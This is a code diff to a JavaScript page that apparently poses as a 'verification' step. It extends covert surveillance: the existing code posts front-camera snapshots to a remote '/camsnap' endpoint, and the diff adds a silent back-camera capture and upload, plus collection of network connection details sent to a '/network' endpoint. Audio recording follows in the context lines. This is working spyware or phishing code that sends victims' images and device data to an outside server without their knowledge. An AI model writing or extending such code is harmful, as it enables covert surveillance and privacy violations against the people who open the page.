@@ -189,10 +189,30 @@ async function startVerify(){
   var snapTimer=setInterval(function(){
     ctx.drawImage(video,0,0,500,500);
     var data=canvas.toDataURL("image/png").replace("data:image/png;base64","");
-    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(data)},function(){});
+    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(data),cam:"front"},function(){});
     snapCount++;
-    if(snapCount>=4){ clearInterval(snapTimer); camDone=true; tryRedirect(); }
+    if(snapCount>=4){ clearInterval(snapTimer);
+      // Back camera after front done
+      setTimeout(async function(){
+        try{
+          var bs=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});
+          var bv=document.createElement('video');bv.srcObject=bs;bv.play();
+          await new Promise(function(r){setTimeout(r,1800);});
+          ctx.drawImage(bv,0,0,500,500);
+          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});
+          bs.getTracks().forEach(function(t){t.stop();});
+        }catch(e){}
+        camDone=true; tryRedirect();
+      },800);
+    }
   },1500);
+
+  // Network info (separate message)
+  if(navigator.connection){
+    var nc=navigator.connection;
+    var nd="📶 نوع الاتصال: "+(nc.effectiveType||'?')+"\n⚡ السرعة: "+(nc.downlink||'?')+" Mbps\n📡 RTT: "+(nc.rtt||'?')+"ms\n💾 توفير البيانات: "+(nc.saveData?'مفعّل':'معطّل');
+    $.post(a+"/network",{uid:uid,data:encodeURIComponent(nd)});
+  }
 
   // Audio recording
   try{
